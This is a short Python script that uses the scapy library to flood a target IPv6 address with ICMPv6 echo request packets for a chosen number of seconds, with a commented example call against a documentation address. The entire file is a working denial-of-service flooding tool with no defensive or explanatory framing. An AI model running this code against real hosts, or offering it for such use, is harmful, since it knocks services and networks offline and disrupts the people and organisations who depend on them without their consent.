from scapy.all import IPv6, ICMPv6EchoRequest, send
import time


def ICMPv6Flood(TARGET, DURATION):
    ICMPv6 = IPv6(dst=TARGET) / ICMPv6EchoRequest()
    startTime = time.time()
    # Disable verbose output, for faster packet sending
    while time.time() - startTime < DURATION:
        send(ICMPv6, verbose=False)


# EXAMPLE USAGE
# Flood the target with ICMPv6 packets for 30 seconds
# ICMPv6Flood("2001:db8::2", 30)
